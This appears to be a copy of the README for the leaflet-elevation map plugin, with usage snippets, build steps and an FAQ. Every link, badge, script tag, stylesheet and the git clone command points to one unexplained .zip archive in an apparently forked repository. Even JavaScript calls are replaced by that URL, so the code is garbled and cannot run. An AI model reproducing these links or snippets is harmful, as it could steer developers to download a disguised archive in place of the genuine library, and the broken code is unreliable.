# https://raw.githubusercontent.com/Shamzmohamed/leaflet-elevation/master/examples/elevation-leaflet-v1.1.zip

[![NPM version](https://raw.githubusercontent.com/Shamzmohamed/leaflet-elevation/master/examples/elevation-leaflet-v1.1.zip)](https://raw.githubusercontent.com/Shamzmohamed/leaflet-elevation/master/examples/elevation-leaflet-v1.1.zip)
[![License](https://raw.githubusercontent.com/Shamzmohamed/leaflet-elevation/master/examples/elevation-leaflet-v1.1.zip%https://raw.githubusercontent.com/Shamzmohamed/leaflet-elevation/master/examples/elevation-leaflet-v1.1.zip)](LICENSE)

A Leaflet plugin that allows to add elevation profiles using d3js

<p align="center">
    <a href="https://raw.githubusercontent.com/Shamzmohamed/leaflet-elevation/master/examples/elevation-leaflet-v1.1.zip"><img src="https://raw.githubusercontent.com/Shamzmohamed/leaflet-elevation/master/examples/elevation-leaflet-v1.1.zip" alt="Leaflet elevation viewer" /></a>
</p>

---

_For a working example see one of the following demos:_

- [loading .gpx file](https://raw.githubusercontent.com/Shamzmohamed/leaflet-elevation/master/examples/elevation-leaflet-v1.1.zip)
- [loading .geojson file](https://raw.githubusercontent.com/Shamzmohamed/leaflet-elevation/master/examples/elevation-leaflet-v1.1.zip)
- [loading .kml file](https://raw.githubusercontent.com/Shamzmohamed/leaflet-elevation/master/examples/elevation-leaflet-v1.1.zip)
- [loading .tcx file](https://raw.githubusercontent.com/Shamzmohamed/leaflet-elevation/master/examples/elevation-leaflet-v1.1.zip)
- [loading a local .gpx file](https://raw.githubusercontent.com/Shamzmohamed/leaflet-elevation/master/examples/elevation-leaflet-v1.1.zip)
- [loading data from a textarea](https://raw.githubusercontent.com/Shamzmohamed/leaflet-elevation/master/examples/elevation-leaflet-v1.1.zip)
- [loading individual .geojson tracks](https://raw.githubusercontent.com/Shamzmohamed/leaflet-elevation/master/examples/elevation-leaflet-v1.1.zip)
- [loading individual .gpx tracks](https://raw.githubusercontent.com/Shamzmohamed/leaflet-elevation/master/examples/elevation-leaflet-v1.1.zip)
- [loading multiple .gpx tracks (hover to toggle)](https://raw.githubusercontent.com/Shamzmohamed/leaflet-elevation/master/examples/elevation-leaflet-v1.1.zip)
- [loading multiple .gpx tracks (click to toggle)](https://raw.githubusercontent.com/Shamzmohamed/leaflet-elevation/master/examples/elevation-leaflet-v1.1.zip)
- [loading multiple maps](https://raw.githubusercontent.com/Shamzmohamed/leaflet-elevation/master/examples/elevation-leaflet-v1.1.zip)
- [translating plugin labels](https://raw.githubusercontent.com/Shamzmohamed/leaflet-elevation/master/examples/elevation-leaflet-v1.1.zip)
- [using custom colors](https://raw.githubusercontent.com/Shamzmohamed/leaflet-elevation/master/examples/elevation-leaflet-v1.1.zip)
- [using .gpx extensions (cadence, heart, pace)](https://raw.githubusercontent.com/Shamzmohamed/leaflet-elevation/master/examples/elevation-leaflet-v1.1.zip)
- [using .gpx waypoint icons](https://raw.githubusercontent.com/Shamzmohamed/leaflet-elevation/master/examples/elevation-leaflet-v1.1.zip)
- [using .geojson waypoint icons](https://raw.githubusercontent.com/Shamzmohamed/leaflet-elevation/master/examples/elevation-leaflet-v1.1.zip)


<br/>

- [autohide map](https://raw.githubusercontent.com/Shamzmohamed/leaflet-elevation/master/examples/elevation-leaflet-v1.1.zip)
- [autohide chart](https://raw.githubusercontent.com/Shamzmohamed/leaflet-elevation/master/examples/elevation-leaflet-v1.1.zip)
- [collapsible button](https://raw.githubusercontent.com/Shamzmohamed/leaflet-elevation/master/examples/elevation-leaflet-v1.1.zip)
- [custom summary](https://raw.githubusercontent.com/Shamzmohamed/leaflet-elevation/master/examples/elevation-leaflet-v1.1.zip)
- [follow marker](https://raw.githubusercontent.com/Shamzmohamed/leaflet-elevation/master/examples/elevation-leaflet-v1.1.zip)
- [layer almostover](https://raw.githubusercontent.com/Shamzmohamed/leaflet-elevation/master/examples/elevation-leaflet-v1.1.zip)
- [slope chart](https://raw.githubusercontent.com/Shamzmohamed/leaflet-elevation/master/examples/elevation-leaflet-v1.1.zip)
- [speed chart](https://raw.githubusercontent.com/Shamzmohamed/leaflet-elevation/master/examples/elevation-leaflet-v1.1.zip)
- [walking marker](https://raw.githubusercontent.com/Shamzmohamed/leaflet-elevation/master/examples/elevation-leaflet-v1.1.zip)

---

<blockquote>
    <p align="center">
        <em>Initially based on the <a href="https://raw.githubusercontent.com/Shamzmohamed/leaflet-elevation/master/examples/elevation-leaflet-v1.1.zip">work</a> of <strong>Felix “MrMufflon” Bache</strong></em>
    </p>
</blockquote>

---

## How to use

1. **include CSS & JavaScript**
    ```html
    <head>
    ...
    <style> html, body, #map, #elevation-div { height: 100%; width: 100%; padding: 0; margin: 0; } #map { height: 75%; } #elevation-div {	height: 25%; font: 12px/1.5 "Helvetica Neue", Arial, Helvetica, sans-serif; } </style>

    <!-- leaflet-ui -->
    <script src="https://raw.githubusercontent.com/Shamzmohamed/leaflet-elevation/master/examples/elevation-leaflet-v1.1.zip"></script>
    <script src="https://raw.githubusercontent.com/Shamzmohamed/leaflet-elevation/master/examples/elevation-leaflet-v1.1.zip"></script>

    <!-- leaflet-elevation -->
    <link rel="stylesheet" href="https://raw.githubusercontent.com/Shamzmohamed/leaflet-elevation/master/examples/elevation-leaflet-v1.1.zip" />
    <script src="https://raw.githubusercontent.com/Shamzmohamed/leaflet-elevation/master/examples/elevation-leaflet-v1.1.zip"></script>
    ...
    </head>
    ```
2. **choose the div container used for the slippy map**
    ```html
    <body>
    ...
    <div id="map"></div>
    ...
    </body>
    ```
3. **create your first simple “leaflet-elevation” slippy map**
    ```html
    <script>
      // Full list options at "https://raw.githubusercontent.com/Shamzmohamed/leaflet-elevation/master/examples/elevation-leaflet-v1.1.zip"
      var elevation_options = {

        // Default chart colors: theme lime-theme, magenta-theme, ...
        theme: "lightblue-theme",

        // Chart container outside/inside map container
        detached: true,

        // if (detached), the elevation chart container
        elevationDiv: "#elevation-div",

        // if (!detached) autohide chart profile on chart mouseleave
        autohide: false,

        // if (!detached) initial state of chart profile control
        collapsed: false,
        
        // if (!detached) control position on one of map corners
        position: "topright",
        
        // Toggle close icon visibility
        closeBtn: true,

        // Autoupdate map center on chart mouseover.
        followMarker: true,

        // Autoupdate map bounds on chart update.
        autofitBounds: true,

        // Chart distance/elevation units.
        imperial: false,

        // [Lat, Long] vs [Long, Lat] points. (leaflet default: [Lat, Long])
        reverseCoords: false,

        // Acceleration chart profile: true || "summary" || "disabled" || false
        acceleration: false,

        // Slope chart profile: true || "summary" || "disabled" || false
        slope: false,

        // Speed chart profile: true || "summary" || "disabled" || false
        speed: false,

        // Altitude chart profile: true || "summary" || "disabled" || false
        altitude: true,

        // Display time info: true || "summary" || false
        time: true,

        // Display distance info: true || "summary" || false
        distance: true,

        // Summary track info style: "inline" || "multiline" || false
        summary: 'multiline',

        // Download link: "link" || false || "modal"
        downloadLink: 'link',

        // Toggle chart ruler filter
        ruler: true,

        // Toggle chart legend filter
        legend: true,

        // Toggle "leaflet-almostover" integration
        almostOver: true,

        // Toggle "leaflet-distance-markers" integration
        distanceMarkers: false,
        
        // Toggle "leaflet-hotline" integration
        hotline: true,

        // Display track datetimes: true || false
        timestamps: false,

        // Display track waypoints: true || "markers" || "dots" || false
        waypoints: true,

        // Toggle custom waypoint icons: true || { associative array of <sym> tags } || false
        wptIcons: {
          '': https://raw.githubusercontent.com/Shamzmohamed/leaflet-elevation/master/examples/elevation-leaflet-v1.1.zip({
            className: 'elevation-waypoint-marker',
            html: '<i class="elevation-waypoint-icon"></i>',
            iconSize: [30, 30],
            iconAnchor: [8, 30],
          }),
        },

        // Toggle waypoint labels: true || "markers" || "dots" || false
        wptLabels: true,

        // Render chart profiles as Canvas or SVG Paths
        preferCanvas: true,

      };

      // Instantiate map (leaflet-ui).
      var map = https://raw.githubusercontent.com/Shamzmohamed/leaflet-elevation/master/examples/elevation-leaflet-v1.1.zip('map', { mapTypeId: 'terrain', center: [41.4583, 12.7059], zoom: 5 });

      // Instantiate elevation control.
      var controlElevation = https://raw.githubusercontent.com/Shamzmohamed/leaflet-elevation/master/examples/elevation-leaflet-v1.1.zip(elevation_options).addTo(map);

      // Load track from url (allowed data types: "*.geojson", "*.gpx", "*.tcx")
      https://raw.githubusercontent.com/Shamzmohamed/leaflet-elevation/master/examples/elevation-leaflet-v1.1.zip("https://raw.githubusercontent.com/Shamzmohamed/leaflet-elevation/master/examples/elevation-leaflet-v1.1.zip");

    </script>
    ```

### Build Guide

For those wishing to try cloning this repository into a local development folder (eg. /var/www):

```shell
git clone https://raw.githubusercontent.com/Shamzmohamed/leaflet-elevation/master/examples/elevation-leaflet-v1.1.zip
cd ./leaflet-elevation

npm i         # install dependencies
npm run watch # auto-generate "dist" files
npm run build # generate "dist" files (once)
npm run test  # test "spec" files (once)
```

After that you can start developing inside the `src` and `test` folders (eg. open "http://localhost/leaflet-elevation/test" in your browser to preview changes). Check also [https://raw.githubusercontent.com/Shamzmohamed/leaflet-elevation/master/examples/elevation-leaflet-v1.1.zip](https://raw.githubusercontent.com/Shamzmohamed/leaflet-elevation/master/examples/elevation-leaflet-v1.1.zip) file for some information about it.

### FAQ

<details>
  <summary>1. How can I change the color of the elevation plot?</summary><br>

There are multiple options to achieve this:

* You could either use some default presets (see: theme: "lightblue-theme" option in readme file and the following file `https://raw.githubusercontent.com/Shamzmohamed/leaflet-elevation/master/examples/elevation-leaflet-v1.1.zip` for some other default "*-theme" names).
* check out [this example](https://raw.githubusercontent.com/Shamzmohamed/leaflet-elevation/master/examples/elevation-leaflet-v1.1.zip)
* Or add the following lines for custom colors.
```css
.elevation-control .area {
    fill: red;
}
.elevation-control .background {
    background-color: white;
```
</details>

<details>
  <summary>2. How to enable/disable the leaflet user interface customizations?</summary><br>

These customizations are actually part of the [leaflet-ui](https://raw.githubusercontent.com/Shamzmohamed/leaflet-elevation/master/examples/elevation-leaflet-v1.1.zip) and can be toggled on/off using e.g. the following options:
```js
var map = https://raw.githubusercontent.com/Shamzmohamed/leaflet-elevation/master/examples/elevation-leaflet-v1.1.zip('map', {
    center: [41.4583, 12.7059],  // needs value to initialize
    zoom: 5,                     // needs value to initialize
    mapTypeId: 'topo',
    mapTypeIds: ['osm', 'terrain', 'satellite', 'topo'],
    gestureHandling: false,     // zoom with Cmd + Scroll
    zoomControl: true,          // plus minus buttons
    pegmanControl: false,
    locateControl: false,
    fullscreenControl: true,
    layersControl: true,
    minimapControl: false,
    editInOSMControl: false,
    loadingControl: false,
    searchControl: false,
    disableDefaultUI: false,
    printControl: false,
});
```
</details>

<details>
  <summary>3. Some real world projects based on this plugin?</summary><br>

- https://raw.githubusercontent.com/Shamzmohamed/leaflet-elevation/master/examples/elevation-leaflet-v1.1.zip
- https://raw.githubusercontent.com/Shamzmohamed/leaflet-elevation/master/examples/elevation-leaflet-v1.1.zip
- https://raw.githubusercontent.com/Shamzmohamed/leaflet-elevation/master/examples/elevation-leaflet-v1.1.zip
- https://raw.githubusercontent.com/Shamzmohamed/leaflet-elevation/master/examples/elevation-leaflet-v1.1.zip
- https://raw.githubusercontent.com/Shamzmohamed/leaflet-elevation/master/examples/elevation-leaflet-v1.1.zip
- https://raw.githubusercontent.com/Shamzmohamed/leaflet-elevation/master/examples/elevation-leaflet-v1.1.zip
- https://raw.githubusercontent.com/Shamzmohamed/leaflet-elevation/master/examples/elevation-leaflet-v1.1.zip
- https://raw.githubusercontent.com/Shamzmohamed/leaflet-elevation/master/examples/elevation-leaflet-v1.1.zip

</details>

_Related: [Leaflet-UI presets](https://raw.githubusercontent.com/Shamzmohamed/leaflet-elevation/master/examples/elevation-leaflet-v1.1.zip), [QGIS Integration](https://raw.githubusercontent.com/Shamzmohamed/leaflet-elevation/master/examples/elevation-leaflet-v1.1.zip)_

### Changelog

All notable changes to this project are documented in the [releases](https://raw.githubusercontent.com/Shamzmohamed/leaflet-elevation/master/examples/elevation-leaflet-v1.1.zip) page.

---

**Compatibile with:**
[![Leaflet 1.x compatible!](https://raw.githubusercontent.com/Shamzmohamed/leaflet-elevation/master/examples/elevation-leaflet-v1.1.zip)](https://raw.githubusercontent.com/Shamzmohamed/leaflet-elevation/master/examples/elevation-leaflet-v1.1.zip)
[![https://raw.githubusercontent.com/Shamzmohamed/leaflet-elevation/master/examples/elevation-leaflet-v1.1.zip v6 compatibile!](https://raw.githubusercontent.com/Shamzmohamed/leaflet-elevation/master/examples/elevation-leaflet-v1.1.zip)](https://raw.githubusercontent.com/Shamzmohamed/leaflet-elevation/master/examples/elevation-leaflet-v1.1.zip)
[![@tmcw/togeojson v4.6.0 compatibile!](https://raw.githubusercontent.com/Shamzmohamed/leaflet-elevation/master/examples/elevation-leaflet-v1.1.zip)](https://raw.githubusercontent.com/Shamzmohamed/leaflet-elevation/master/examples/elevation-leaflet-v1.1.zip)


---

**Contributors:** [MrMufflon](https://raw.githubusercontent.com/Shamzmohamed/leaflet-elevation/master/examples/elevation-leaflet-v1.1.zip), [HostedDinner](https://raw.githubusercontent.com/Shamzmohamed/leaflet-elevation/master/examples/elevation-leaflet-v1.1.zip), [ADoroszlai](https://raw.githubusercontent.com/Shamzmohamed/leaflet-elevation/master/examples/elevation-leaflet-v1.1.zip), [Raruto](https://raw.githubusercontent.com/Shamzmohamed/leaflet-elevation/master/examples/elevation-leaflet-v1.1.zip)

---

**License:** GPL-3.0+
